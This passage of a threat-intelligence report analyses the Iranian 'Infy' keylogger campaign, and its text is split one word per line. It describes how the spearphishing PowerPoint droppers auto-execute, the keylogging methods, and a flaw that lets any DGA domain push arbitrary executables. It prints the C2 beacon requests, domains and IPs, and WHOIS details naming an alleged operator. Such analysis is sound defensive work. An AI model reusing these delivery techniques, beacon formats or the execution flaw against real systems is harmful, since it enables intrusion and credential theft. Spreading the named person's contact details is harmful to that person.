overlap 
with 
espionage 
against 
perceivedexternal 
threats. 
Moreover, 
the 
locations 
and 
discernable 
nature 
of 
the 
compromised 
hosts 
align 
with 
known 
policy 
objectives 
of 
the 
IslamicRepublic. 
It 
is 
worthnotingthat 
in 
order 
to 
establish 
a 
moreaccuratecount, 
wehad 
to 
deduplicate 
records 
from 
victims 
appearing 
to 
connect 
from 
multiple 
countries. 
Unsurprisingly, 
many 
victims 
located 
in 
Iran 
had 
been 
usingVPN 
services, 
leading 
to 
connections 
from 
a 
changing 
set 
of 
countries 
that 
their 
circumvention 
tool 
had 
tunneled 
traffic 
through. 
Efforts 
were 
made 
to 
exclude 
circumvention 
toolIPs, 
anddetermine 
theclientsthat 
were 
originally 
based 
in 
Iran 
despitetheir 
tunneledtraffic. 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Infy 
(v. 
25 
31) 
Infections, 
December 
2015 
May 
2016 


While 
the 
near 
majority 
of 
the 
victims 
are 
located 
in 
Iran,the 
remaining 
hosts 
arewidely 
distributed 
around 
the 
world, 
with 
a 
higher 
concentration 
in 
the 
United 
States, 
Sweden, 
Germanyand 
Iraq 
– 
locations 
with 
large 
Iranian 
diasporas 
or 
regional 
interests. 
Several 
compromised 
systems 
maintain 
a 
clear 
relationshipto 
regional 
adversariesand 
foreign 
entitiesthat 
Iran 
maintains 
an 
espionage 
interest 
in. 
At 
least 
two 
hosts 
based 
in 
Israel 
have 
been 
compromisedto 
date, 
althoughin 
one 
case 
these 
systems 
appear 
to 
have 
been 
associated 
with 
aperson 
of 
Arabic 
or 
Persian 
descent. 
TheInfy 
group 
also 
appears 
to 
engage 
in 
espionage 
activities 
against 
foreign 
governments 
and 
businesses. 
The 
actors 
successfully 
compromised 
a 
host 
of 
an 
Saudi 
government 
institutions 
on 
January 
17,2016,and 
maintained 
access 
for 
at 
least 
two 
weeks. 
Similarly,a 
computer 
in 
Riyadh 
located 
ona 
network 
registered 
to 
the 
National 
Engineering 
Services 
andMarketing 
Company 
was 
compromised. 
Multiple 
systems 
in 
Pakistan 
and 
Afghanistanhave 
been 
breached, 
including 
several 
on 
Afghangovernment 
networks. 


InfyTools&Techniques 


In 
order 
to 
initiallycompromise 
the 
designated 
targets,the 
attackers 
typically 
distributed 
specificallycrafted 
malicious 
documents 
containing 
Infy 
through 
spearphishing 
attacks. 
The 
attackers 
in 
most 
cases 
took 
existing 
PowerPoint 
presentations,or 
crafted 
new 
ones, 
and 
inserted 
some 
PE32 
dropper 
as 
a 
Packager 
Shell 
Object 
inside 
the 
titleslide. 
Interestingly, 
several 
of 
these 
documentsexpose 
the 
original 
file 
pathin 
the 
attacker’s 
computer, 
showing 
the 
account 
name 
of 
the 
user 
who 
craftedthe 
attacks: 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 



With 
the 
executable 
embedded 
in 
the 
presentation, 
by 
assigning 
an 
“OnPrevious” 
custom 
“Object 
Action” 
animation, 
it 
is 
automatically 
extracted 
to 
%Temp% 
and 
executed 
in 
the 
moment 
thepresentation 
is 
launched. 



Normally, 
the 
victim 
would 
have 
to 
click 
“Ok” 
to 
a 
security 
warning 
dialog, 
before 
the 
droppercan 
proceed 
with 
its 
execution. 
Ironically, 
the 
patches 
introduced 
by 
Microsoftto 
fix 
the 
Sandworm 
vulnerabilities, 
have 
changed 
the 
securitydialogs 
to 
messages 
that 
are 
alot 
less 
alarming. 
Asshowed 
in 
the 
previous 
picture, 
the 
attackersalso 
tend 
to 
create 
multiplePackager 
Shell 
Objects, 
eventually 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


triggered 
by 
different 
events, 
probably 
to 
increase 
thechance 
that 
the 
victims 
would 
concede 
into 
running 
the 
payload. 


BeforepatchMS14060AfterpatchMS14060
In 
more 
recent 
iterations 
of 
these 
malicious 
documents, 
the 
attackers 
started 
protecting 
themwith 
a 
password, 
so 
thatthey 
can 
only 
be 
open 
in 
readonly 
mode,making 
their 
inspection 
slightly 
harder. 


The 
mainmalware 
artifact 
that 
we 
observed 
employedby 
this 
group 
is 
avery 
simple 
keyloggerdeveloped 
in 
Delphi. 
It 
is 
compiled 
in 
the 
form 
of 
a 
Windows 
DLL 
filethat 
is 
installed 
by 
an 
initialdropper 
inside 
the 
“C:\ProgramData\Adobe\” 
folder 
(or 
“C:\Documents 
and 
Settings\All 
Users\Application 
Data\Adobe\” 
folder 
inolder 
versions 
of 
Windows), 
named 
“airplugin.vX.X.X.dll”,and 
registered 
in 
the 
Windows 
registry 
to 
be 
executed 
at 
startup 
through 
rundll32.exe 
and 
with 
the 
arguments 
“startX 
/exc” 
(where 
X 
is 
a 
digit 
like 
1,2 
or3, 
dependingon 
the 
version 
of 
the 
malware). 
Before 
installing 
it 
permanently, 
thefileisalso 
temporarily 
stored 
with 
thefilename 
pattern 
“mpro.X.X.X.dll”. 


One 
of 
the 
latest 
versions 
employed 
at 
the 
time 
of 
writing, 
marked 
as 
00030, 
saw 
a 
change 
in 
the 
naming 
scheme 
of 
the 
files, 
as 
well 
as 
of 
the 
functions 
exported 
by 
the 
DLL. 
For 
example, 
the 
latest 
sample24 
we 
obtained 
andutilized 
on 
midApril 
2016, 
is 
installed 
in 
the 
folder 
“C:\ProgramData\CyberLink\” 
with 
name 
“CLMediaLibraryX.X.X.dll” 
and 
it 
is 
executed 
with 
the 
arguments 
“mainf 
/rcv”. 


The 
Infy 
malware 
is 
very 
limited 
in 
functionality 
andseems 
to 
have 
been 
primarily 
designed 
torecord 
keystrokes, 
that 
are 
then 
stored 
in 
a 
ROTobfuscated 
.dat 
file 
and 
lateruploaded 
to 
the 
primary 
command 
and 
control 
server. 
While 
most 
Windows 
keyloggers 
either 
interceptkeystrokes 
at 
kernel 
level 
or 
byusing 
eitherthe 
GetAsyncKeyState 
or 
SetWindowsHookEx 
win32 
APIs, 
Infy 
insteaduses 
RegisterHotKey 
to 
install 
global 
hotkeys 
on 
allavailable 
keys. 
Whilethis 
is 
a 
knowntechnique, 
it 
is 
relatively 
uncommon, 
due 
to 
the 
simplicityof 
thealternatives 
previously 
mentioned. 


24 
OmidKobabi.pps 
0b7272dd9cf1968dea97f19f154274b8 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Probably 
in 
order 
to 
prioritize 
later 
inspection 
by 
the 
attackers, 
the 
log 
file 
highlightskeystrokes 
thathave 
been 
recorded 
from 
known 
browser 
windows 
(Internet 
Explorer,Firefox, 
Chrome, 
and 
Opera). 
It 
is 
plausible 
that 
the 
main 
intent 
ofthe 
attackers 
is 
to 
steal 
credentials 
for 
email 
andsocial 
media 
accounts, 
as 
was 
seen 
amongst 
otherIranian 
actors, 
such 
as 
FlyingKitten. 


For 
example: 


00000250 
65 
64 
21 
53 
74 
61 
74 
65 
73 
2a 
bc 
0e 
0b 
0e 
0b 
66 
|ed!States*.....f|
00000260 
69 
72 
65 
66 
6f 
78 
2f 
65 
78 
65 
3d 
2b 
2b 
2b 
49 
6e 
|irefox/exe=+++In|
00000270 
42 
72 
6f 
77 
73 
65 
72 
5c 
5e 
21 
50 
72 
6f 
62 
6c 
65 
|Browser\^!Proble|
00000280 
6d 
21 
6c 
6f 
61 
64 
69 
6e 
67 
21 
70 
61 
67 
65 
21 
2e 
|m!loading!page!.|
00000290 
21 
4d 
6f 
7b 
69 
6c 
6c 
61 
21 
46 
69 
72 
65 
66 
6f 
78 
|!Mo{illa!Firefox|
000002a0 
3f 
bc 
bc 
21 
65 
73 
74 
3d 
32 
34 
3f 
0e 
0b 
0e 
0b 
66 
|?..!est=24?....f|
000002b0 
69 
72 
65 
66 
6f 
78 
2f 
65 
78 
65 
3d 
2b 
2b 
2b 
49 
6e 
|irefox/exe=+++In|
000002c0 
42 
72 
6f 
77 
73 
65 
72 
5c 
68 
74 
74 
70 
3b 
30 
30 
77 
|Browser\http;00w|
000002d0 
77 
77 
2f 
67 
6f 
6f 
67 
6c 
65 
2f 
63 
6f 
6d 
30 
6e 
63 
|ww/google/com0nc|
000002e0 
72 
5e 
21 
4d 
6f 
7b 
69 
6c 
6c 
61 
21 
46 
69 
72 
65 
66 
|r^!Mo{illa!Firef| 


Additionally, 
the 
Infy 
malwareinitiates 
a 
separate 
Timer 
and 
itperiodically 
invokes 
the 
GetClipboardData 
API 
to 
copy 
and 
store 
the 
content 
in 
the 
same 
.dat 
log 
file. 
For 
example: 


00000370 
0e 
0b 
ac 
4e 
65 
77 
21 
43 
6c 
69 
70 
62 
6f 
61 
72 
64 
|...New!Clipboard|
00000380 
bc 
0e 
0b 
0e 
0b 
0e 
0b 
0e 
0b 
65 
78 
70 
6c 
6f 
72 
65 
|.........explore|
00000390 
72 
2f 
65 
78 
65 
3d 
41 
63 
72 
6f 
62 
61 
74 
3f 
bc 
bc 
|r/exe=Acrobat?..| 


This 
additional 
interception 
might 
have 
been 
employed 
to 
circumvent 
the 
use 
of 
password 
management 
software, 
a 
common 
component 
of 
digital 
security 
trainings, 
that 
allow 
the 
users 
to 
avoid 
remembering 
and 
manually 
typing 
the 
passwords 
for 
logging 
into 
all 
thedifferent 
online 
servicesthey 
commonly 
access. 


NetworkInfrastructureandCommunications 


The 
Infy 
malware 
is 
designed 
to 
regularly 
beacon 
back 
toan 
HTTP 
servercontrolled 
by 
the 
operators. 
At 
first, 
it 
performs 
an 
initial 
check 
in 
with 
the 
command 
and 
control 
to 
register 
andeventually 
fetch 
updates. 
The 
URLs 
and 
the 
argumentsused 
by 
the 
malware 
have 
occasionallychanged, 
but 
at 
the 
time 
of 
the 
broader 
infrastructure 
takedown 
this 
function 
looked 
like 
the 
following: 


GET 
/glp/uglp.php?cn=[COMPUTER 
NAME]&dn=1&ver=[VERSION 
NUMBER]&lfolder=f1&cpuid=[CPUID]&machineguid=[MACHINE 
GUID]&tt=[TIMESTAMP]
HTTP/1.1 
UserAgent: 
Mozilla/4.0 
(compatible; 
MSIE 
8.0; 
Win32)
Host: 
updatebox4.com 
CacheControl: 
nocache 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


The 
response 
from 
theserver 
would 
appear 
as 
a 
page 
not 
found 
error: 


HTTP/1.1 
404 
Not 
Found 
Date: 
Fri, 
01 
Jan 
2016 
12:59:59 
GMT 
Server: 
Apache 
XPoweredBy: 
PHP/5.3.23 
Connection: 
close 
TransferEncoding: 
chunked 
ContentType: 
text/html 


144 
<!DOCTYPE 
HTML 
PUBLIC 
"//
IETF//DTD 
HTML 
2.0//EN"> 
<html><head> 
<title>404 
Not 
Found</title> 
</head><body> 
<h1>Not 
Found</h1> 
<p>The 
requested 
URL 
was 
not 
found 
on 
this 
server.</p> 
<p>Additionally, 
a 
404 
Not 
Found 
error 
was 
encountered 
while 
trying 
to 
use 
an 
ErrorDocument 
to 
handle 
the 
request.</p> 
</body></html> 


0 


After 
the 
firstbeacon, 
and 
at 
a 
certaininterval, 
the 
versions 
of 
Inty 
malware 
observedwould 
then 
make 
a 
POST 
request 
tothe 
URL 
“/glp/rglp.php”containinginformation 
on 
the 
system, 
a 
timestamp, 
andan 
encoded 
and 
obfuscated 
copy 
of 
the 
log 
file 
generated 
by 
the 
keylogger. 
Interestingly, 
the 
server 
would 
respond 
with 
an 
“OK” 
followed 
by 
a 
common 
PHP 
errorcaused 
by 
mishandling 
the 
generation 
of 
the 
response, 
which 
exposes 
the 
actualfile 
path 
of 
the 
script 
and 
indicates 
an 
intent 
attemptto 
modify 
headers. 


HTTP/1.1 
200 
OK 
Date: 
Fri, 
01 
Jan 
2016 
13:00:02 
GMT 
Server: 
Apache 
XPoweredBy: 
PHP/5.3.23 
ContentLength: 
2 
Connection: 
close 
ContentType: 
text/html 


OK<br 
/> 
<b>Warning</b>: 
Cannot 
modify 
header 
information 
headers 
already 
sent 
by(output 
started 
at 
/home/updatese/public_html/ro/ro.php:146) 
in 
<b>/home/updatese/public_html/ro/ro.php</b> 
on 
line 
<b>147</b><br 
/> 


Under 
the 
last 
observed 
versions 
of 
the 
Infy 
agent, 
the 
C&C 
domain 
was 
updatebox4.com.25 
As 
noted 
by 
the 
Danish 
Defense 
IntelligenceService’s 
Center 
for 
Cybersecurity 
and 
Palo 
Alto’sresearchinto 
previous 


25 
IPaddresses192.69.200.143(First:20140606,
Last:20160407), 
138.201.47.153(20160406, 
20160414). 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Infy 
and 
Infy 
M 
variants, 
the 
domainsused 
for 
communications 
changedacross 
differentversions, 
potentially 
as 
aresult 
of 
their 
blacklisting 
and 
detection 
byantivirus 
products 
(reasons 
for 
this 
hypothesis 
are 
noted 
in 
Participants 
section). 
Older 
infrastructure 
resources 
did 
continue 
to 
be 
maintained 
in 
order 
service 
agents 
from 
past 
versions, 
and 
Palo 
Altonotes 
in 
its 
sinkhole 
data 
that 
a 
nontrivialnumber 
of 
clients 
were 
infected 
by 
extremelyold 
agents. 
For 
example, 
the 
DNS 
records 
were 
all 
been 
reconfigured 
simultaneously 
in 
April 
2016 
whenInfy 
attempted 
to 
changeproviders. 


The 
followingare 
other 
domains 
we 
observed 
used 
as 
command 
and 
controlin 
thepast. 


bestupdateserver.com 


IP 
First 
Seen 
Last 
Seen 
192.69.208.203 
20130413 
20160330 
192.69.208.202 
20130413 
20130413 
138.201.47.153 
20160408 
20160414 


updateserver1.com 


IP 
First 
Seen 
Last 
Seen 
192.69.200.143 
20130523 
20160325 
138.201.47.153 
20160408 
20160411 


updateserver3.com 


IP 
First 
Seen 
Last 
Seen 
192.69.200.143 
20140606 
20160407 
138.201.47.153 
20160406 
20160414 


ANotSoCleverFailoverStrategy 


The 
authors 
of 
the 
Infykeylogger 
included 
afailover 
command 
andcontrol 
communication 
system. 
By 
usinga 
DomainGenerationAlgorithm 
(DGA), 
the 
malware 
is 
instructed 
to 
contact 
a 
different 
domain 
every 
dayin 
theformof 
box40XX.net, 
where 
XXisa 
digit 
that 
appears 
to 
increment 
every 
dayand 
resets 
on 
a 
monthly 
basis. 
While 
normally 
DGAs 
aretriggered 
only 
in 
the 
case 
thatthe 
primary 
command 
and 
control 
server 
isn't 
responding 
(because 
it 
has 
been 
seized, 
or 
otherwise 
disabled), 
in 
this 
case 
the 
malware 
attemptsto 
systematically 
contact 
the 
daily 
domainevery 
timea 
set 
timer 
hits, 
regardless 
ofthe 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


availability 
of 
the 
main 
C&C. 
We 
noticed 
on 
first 
discovery 
of 
this 
DGA 
mechanism 
that 
only 
in 
one 
case 
had 
a 
failoverdomain 
has 
been 
registered 
bythe 
operators 
(box4054.net), 
while 
all 
the 
remaining 
ones 
had 
been 
left 
unregistered. 


We 
alsonoticed 
that 
the 
primary 
command 
and 
control 
server 
is 
able 
to 
instruct 
the 
agents 
todownload 
and 
execute 
any 
binary 
file. 
In 
order 
to 
do 
so, 
the 
command 
and 
controlserver 
would 
simply 
replyto 
the 
firstcheckin 
request 
with 
an 
HTTP 
302redirect 
to 
a 
URL 
pointing 
to 
a 
Windows 
executable. 
This 
is 
normally 
usedby 
the 
primary 
C&C 
to 
distribute 
updates 
of 
the 
malware, 
when 
new 
versions 
have 
been 
developed 
andtested. 
We 
attempted 
to 
reproduce 
this 
procedure 
and 
discoveredthat 
wewere 
able 
to 
trigger 
the 
malware 
to 
pull 
and 
executeany 
binaryfilewe 
wanted 
also 
when 
contacting 
one 
of 
the 
DGA 
domains. 
Clearly, 
ifnoticed 
byother 
malicious 
actors, 
thisflaw 
in 
the 
design 
of 
Infy's 
command 
and 
control 
system 
could 
beabused 
to 
deploy 
additional 
malware,since 
no 
verification 
or 
authentication 
of 
the 
downloadedbinary 
is 
performed. 


In 
order 
to 
collect 
more 
accurate 
information 
onthe 
nature 
of 
the 
targets 
of 
the 
Infy 
campaign, 
notify 
victims 
and 
prevent 
abuse 
of 
this 
security 
failure, 
beginning 
at 
the 
end 
ofDecember 
2015 
weregistered 
allthe 
domains 
that 
were 
left 
available 
and 
recorded 
therequestscoming 
in 
from 
thisfailover 
mechanism. 
When 
theInfy 
group 
began 
notice 
that 
its 
domains 
and 
hosts 
were 
being 
taken 
down, 
it 
sought 
to 
register 
additional 
DGA 
domains 
and 
were 
ableto 
control 
two 
more 
names 
(box4070.net 
and 
box4071.net). 
The 
remainder 
are 
under 
our 
control 
and 
being 
sinkholedto 
prevent 
abuse. 


ParticipantstoInfy 


Across 
at 
least 
six 
years 
of 
operation, 
at 
least 
three 
within 
the 
scope 
of 
the 
currently 
documented 
campaign, 
the 
entities 
behind 
Infy 
have 
recurrently 
used 
the 
same 
identifiers 
in 
their 
registrations 
and 
communications, 
which 
indicate 
an 
Iranianorigin 
and 
could 
be 
personallyidentifiable 
information. 


While 
multiple 
sets 
ofdomains 
have 
beenused 
in 
the 
command 
andcontrol 
infrastructure 
for 
both 
Infy 
agents, 
these 
domains 
were 
typical 
originally 
registered 
under 
email 
addresses 
associatedto 
thename 
‘Amin 
Jalali,’ 
withthe 
addresses 
aminjalali_58@yahoo.com,aj58mailbox@
yahoo.com,26 
and 
am54ja@yahoo.com.27 
The 
contact 
information 
on 
these 
domainshave 
been 
updated 
in 
recent 
months 
with 
false 
identities 
attributed 
to 
Poland 
and 
India 
to 
masque 
the 
originalregistrant, 
however, 
the 
ownership 
and 
contact 
emailremains 
the 
same. 


Registration 
Information 
for 
bestwebstat.com 
Registrant 
Name:amin 
jalali 
Registrant 
Organization:safehostonline 
Registrant 
Street1:afriqa 
street 
number 
68 
Registrant 
City:tehran 


26 
Possibly 
nota 
valid 
address 
with 
Yahoo!'s 
username 
schema. 
27 
These 
dates 
are 
assumably 
Persian 
calendardatesand 
suggest 
Jalali 
is 
in 
his 
midthirtiesatthe 
time 
of 
this 
publication. 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


RegistrantState:Tehran 
RegistrantPostal 
Code:19699 
RegistrantCountry:IR 
RegistrantPhone:+98.935354252 
RegistrantFax: 
RegistrantEmail:aminjalali_58@yahoo.com 


The 
aliases 
associated 
withAmin 
Jalali 
appear 
elsewhere 
outside 
of 
registrations. 
A 
user 
‘aj58’ 
posted28 
in 
late 
July 
2015 
onthe 
user 
forums 
ofSophos 
claiming 
that 
the 
detection 
ofthe 
domains 
‘bestupdateserver.com’ 
and 
‘updateserver1.com’ 
as 
malicious 
was 
mistaken, 
and 
that 
there 
was 
no 
malware 
hosted 
on 
these 
sites. 
Both 
domains 
were 
frequently 
used 
as 
command 
andcontrol 
fortheir 
malware 
campaigns 
in 
the 
first 
half 
of 
2015, 
and 
the 
categorizationof 
thedomains 
as 
malicious 
was 
correct. 
While 
McAfee 
appears 
tohave 
changedthe 
categorization 
in 
itsTrustedSource 
database, 
theuser 
apparentlywas 
unable 
to 
clear 
the 
domains 
from 
a 
sufficient 
number 
of 
antivirus 
products, 
and 
registered 
the 
second 
group 
of 
domains 
a 
few 
weeks 
later. 


.
A 
similar 
email 
address 
(without 
theunderscore) 
commented 
onan 
article29 
posted 
on 
Iranian 
Army 
News 
site 
about 
the 
death 
of 
Jihad 
Mughniyeh, 
the 
son 
of 
Hezbollah 
commander 
Imad 
Mughniyeh, 
who 
was 
killed 
in 
Syria 
in 
anoperation 
believedto 
havebeen 
conducted 
by 
Israel, 
mourning 
his 
deathand 
proclaiming 
him 
amartyr. 


28 
https://community.sophos.com/products/unifiedthreatmanagement/
f/55/t/46992 


http://arjanews.ir/%D8%AC%D9%87%D8%A7%D8%AF%
D9%85%D8%BA%D9%86%DB%8C%D9%87%
D8 
%A7%D8%B2%
DA%86%D9%87%
D8%B2%D9%85%D8%A7%D9%86%
D8%AA%D8%AD%D8%AA%
D9 
%86%D8%B8%D8%A7%D8%B1%D8%AA%
D8%B3%D8%B1%D8%AF%D8%A7%D8%B1%
D8%B3/ 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


“Inmemoryofhim,restinpeace.Luckyhimtobecomeamartyr.”
Finally, 
the 
sinkholelogs 
on 
theDGA 
failovermechanism 
provides 
some 
indication 
as 
to 
the 
development 
cycle 
and 
actors 
behind 
the 
Infymalware. 
Prior 
to 
the 
distribution 
of 
new 
versions 
of 
the 
agent, 
the 
Infydevelopers 
appear 
to 
consistently 
conduct 
testsfromlocal 
hosts,which 
indicates 
that 
the 
control 
and 
maintenance 
ofthe 
software 
occurs 
in 
theKhorasanRazavi 
province 
of 
Iran,potentially 
in 
the 
city 
ofMashhad. 
These 
testing 
periodsappearas 
episodes 
where 
a 
fewhosts 
from 
a 
previously 
unseen 
version 
of 
the 
client 
register 
on 
the 
backup 
infrastructure,and 
are 
the 
only 
live 
copies 
of 
thatversion 
for 
a 
length 
of 
time. 
Typically 
these 
hosts 
have 
the 
same 
generic 
systeminformation, 
likely 
virtual 
machines 
dedicated 
to 
testing 
of 
the 
agent, 
andhave 
mistakes 
in 
their 
operation. 
Those 
clients 
then 
stop 
responding 
around 
the 
time 
that 
other 
systems 
from 
a 
heterogeneous 
set 
oflocations 
and 
machinenames 
begin 
to 
register,indicating 
that 
the 
version 
has 
been 
pushed 
outto 
thepublic. 


Our 
dataset 
covers 
three 
testing 
and 
deployment 
cycles 
of 
versions 
of 
theInfy 
agent. 


Version 
Tested 
on 
Released 
29 
3 
January 
2016 
13 
January 
2016 
30 
2 
February 
2016 
21 
February 
2016 
31 
1 
May 
2016 
? 


The 
followingare 
the 
computer 
names 
and 
IP 
addresses 
of 
the 
beacons 
we 
believe 
to 
belongfrom 
developers 
of 
the 
Infy 
malware, 
performed 
in 
the 
aforementioned 
testing 
cycles: 


Hostname 
Version 
Seen 
IP(s) 
Location(s) 
FERDOWSI 
29 
13/1/2016 
2.180.157.xxx 
31.14.152.xxx 
5.232.90.xxx 
46.100.135.xxx 
2.180.92.xxx 
5.222.214.xxx 
2.182.52.xxx 
2.180.143.xxx 
65.49.68.xxx 
Khorasan 
Razavi, 
Iran 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


DESKTOPTFG03B1 
30 
2/2/2016 
192.99.220.xxx 
5.232.151.xxx 
5.232.157.xxx 
Khorasan 
Razavi, 
Iran 
DESKTOPTFG03B1 
29 
9/1/2016 
2.180.96.xxx 
5.232.135.xxx 
5.232.140.xxx 
5.232.136.xxx 
5.232.143.xxx 
Mashhad, 
Khorasan 
Razavi, 
Iran 
WINA2HDDI940BE 
29 
12/1/2016 
192.99.220.xxx 
Canada 
(OVH) 
WINSLRJHLCR4VK 
30 
20/2/2016 
5.232.154.xxx 
Khorasan 
Razavi, 
Iran 
USER1DA087865E 
31 
1/5/2016 
217.172.105.xxx 
Iran 
(Asiatech) 
DESKTOPTFG03B1 
31 
1/5/2016 
217.172.105.xxx 
Iran 
(Asiatech) 


Othernames 
and 
references 
to 
the 
infrastructure 
maintained 
by 
Infy, 
or 
used 
in 
communications 
with 
targets, 
suggest 
pseudonyms 
or 
identitiesof 
the 
culprits, 
as 
well 
as 
their 
origin 
or 
political 
disposition. 
In 
the 
series 
ofspearphishing 
attemptsagainst 
Persianlanguage 
media 
figuresconducted 
prior 
to 
the 
June 
2013 
election, 
the 
phrase 
Baran 
Omid 
was 
used 
consistently, 
either 
the 
name 
of 
a 
woman 
or 
the 
phrase 
“Rain 
of 
Hope.” 
The 
word, 
Baran, 
wouldalso 
arise 
in 
the 
executable 
extracted 
by 
earlier 
versions 
of 
the 
malware 
“C__Users_baran_AppData_Local_Temp_done[1].exe.” 
In 
metadatadocuments 
that 
servedas 
malware 
vectors, 
we 
also 
find 
document 
author 
names 
of 
‘baran.’30 


In 
later 
versions 
of 
Infy 
documents,the 
authorship 
information 
is 
set 
to 
‘ya 
zahra’ 
and 
‘ya 
husein’ 
expressions 
that 
maintain 
Shi’a 
religious 
connotations 
referring 
to 
the 
wife 
of 
Ali 
and 
daughter 
of 
Mohammad,and 
Ali’s 
martyred 
son, 
respectively. 


ResponsetoPublication 


On 
May 
2, 
2016, 
Palo 
Alto 
Networks 
published 
the 
report 
“Prince 
of 
Persia,” 
which 
provided 
the 
first 
public 
and 
widelyreported 
indication 
of 
Infy’s 
activities 
in 
Iran, 
whileotherpublications 
either 
refrained 
from 
making 
theassociation 
or 
werenotopenly 
available. 
By 
May 
12,31 
Palo 
Alto 
began 
tosinkhole 
the 
primary 
command 
and 
control 
infrastructure, 
whichcombined 
with 
the 
prior 
registration 
of 
the 
DGA 
resources, 
severely 
inhibited 
the 
continued 
operation 
of 
the 
Infy 
campaign. 
However, 
within 
this 
struggle 
to 
maintain 
access, 
additional 
incidents 
of 
note 
occurred. 


Firstly, 
actionstaken 
by 
telecommunications 
regulators 
in 
Iranindicate 
either 
an 
intervention 
to 
end 
operation 
of 
the 
Infy 
networkor 
an 
attempt 
to 
interfere 
with 
further 
research. 
As 
ofJune 
2016, 
a 
subset 
of 
the 
domains 
identified 
in 
the 
operationsof 
theInfy 
campaigns 
werespecifically 
inaccessible 
inside 
of 
Iran, 
asidefromtheir 
being 
sinkholed 
to 
Shadowserver 
or 
directed 
to 
localhost.32 
This 
unavailability 
is 
the 


30 
June12, 
2013 
(49664f69885d40c6913378ac264afd2a) 
31 
As 
provided 
by 
Palo 
Alto 
32 
bestbox3.com, 
bestupdateserver.com, 
bestupdateserver2.com,updatebox4.com, 
updateserver1.com, 
updateserver3.com, 
youripinfo.com 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


resultof 
thecontent 
filtering 
mechanism 
imposed 
by 
the 
Iranian 
government 
blocking 
access 
to 
the 
sinkhole 
through 
DNS 
tampering 
and 
HTTP 
filtering. 
The 
restrictions 
on 
Infy 
areexplicitly 
targeted 
against 
requestsfor 
command 
andcontrol 
domainnames 
identified 
inthe 
Palo 
Alto 
report. 
This 
filtering 
is 
conducted 
at 
the 
primary 
international 
gateway 
maintained 
by 
the 
Telecommunication 
Company 
of 
Iran 
(AS12880), 
and 
as 
a 
result 
preventsfurther 
communications 
from 
the 
clients 
in 
Iran. 


> 
Host: 
updateserver3.com 
> 
< 
HTTP/1.1 
403 
Forbidden 
<html><head><meta 
httpequiv="
ContentType" 
content="text/html; 
charset=windows1256"><
title>FR16 
</title></head><body><iframe 
src="http://10.10.34.34?type=Invalid 
Site&policy=MainPolicy 
" 
style="width: 
100%; 
height: 
100%" 
scrolling="no" 
marginwidth="0" 
marginheight="0" 
frameborder="0" 
vspace="0" 
hspace="0"></iframe></body></html> 


This 
is 
a 
unique 
phenomenon. 
Other 
domains 
from 
Palo 
Alto 
reports 
unrelated 
to 
Iran 
do 
not 
appear 
to 
have 
been 
blocked,norhave 
domains 
connected 
to 
other 
Iranian 
intrusion 
campaignssuch 
asFlying 
Kitten 
or 
Cleaver. 
It 
appears 
thatthis 
unique 
action 
occurred 
after 
Palo 
Alto’s 
report, 
forreasons 
that 
are 
not 
immediately 
clear. 
The 
filtering 
policy 
indicates 
that 
Iranian 
authorities 
had 
specificallyintervened 
to 
blockaccess 
tothe 
command 
andcontrol 
domains 
of 
a 
statealigned 
intrusioncampaign 
ata 
country 
level. 


Concurrently, 
the 
sinkhole 
ofcampaignresources 
set 
off 
a 
struggle 
to 
regain 
controlof 
theclientsand 
shift 
command 
infrastructure 
to 
alternative 
providers 
with 
new 
hostnames. 
Palo 
Alto 
began 
to 
disrupt 
access 
to 
Infy’s 
primary 
domain 
names 
on 
a 
Thursday, 
the 
Iranian 
weekend. 
It 
was 
notuntil 
the 
start 
of 
the 
Iranian 
work 
week, 
the 
morningof 
Saturday, 
May 
14, 
that 
the 
Infy 
actorsappeared 
to 
notice 
the 
loss 
of 
their 
network 
and 
then 
the 
registration 
of 
the 
DGA. 
In 
their 
reaction 
and 
investigation, 
the 
developers 
again 
exposed 
their 
original 
IP 
addresses, 
as 
they 
attempted 
to 
investigate 
the 
natureof 
theDGA 
domains 
that 
hadbeen 
registered 
(again 
from 
the 
Razavi 
Khorasan 
province). 
Only 
at 
the 
moment 
that 
the 
backup 
domains 
were 
neededmost 
didthe 
actors 
notice 
their 
unavailability, 
nearly 
sixmonths 
after 
wesilently 
began 
our 
sinkholing 
operation. 


5.232.158.XXX 
[
14/May/2016:03:55:22 
0400] 
"GET 
/themes/?tt=csdkjchskdjchskd&cn=cdskh&ver=&lfolder&machineguid=ckshdcksjdchkdHTTP/1.1" 
404 
233 
"" 
"Mozilla/5.0 
(Windows 
NT 
6.1;Trident/7.0;rv:11.0) 
likeGecko" 


184.75.221.XXX 
[
14/May/2016:12:35:32 
0400] 
"GET 
/themes/?tt=csdkjchskdjchskd&cn=cdskh&ver=&lfolder&machineguid=ckshdcksjdchkdHTTP/1.1" 
404 
200 
"" 
"Mozilla/5.0 
(Windows 
NT 
6.1;WOW64) 
AppleWebKit/537.36 
(KHTML, 
likeGecko) 
Chrome/51.0.2687.0 
Safari/537.36OPR/38.0.2205.0(Editiondeveloper)" 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


192.99.220.XXX 
[
14/May/2016:13:13:34 
0400] 
"GET 
/themes/?tt=csdkjchskdjchskd&cn=cdskh&ver=&lfolder&machineguid=ckshdcksjdchkdHTTP/1.1" 
404 
142 
"" 
"Mozilla/5.0 
(Windows 
NT 
6.1;Win64; 
x64; 
rv:46.0)Gecko/20100101 
Firefox/46.0" 


Despite 
the 
sinkhole 
actions 
and 
registrations 
of 
backup 
domains 
by 
researchers, 
the 
Infy 
actorgroup 
did 
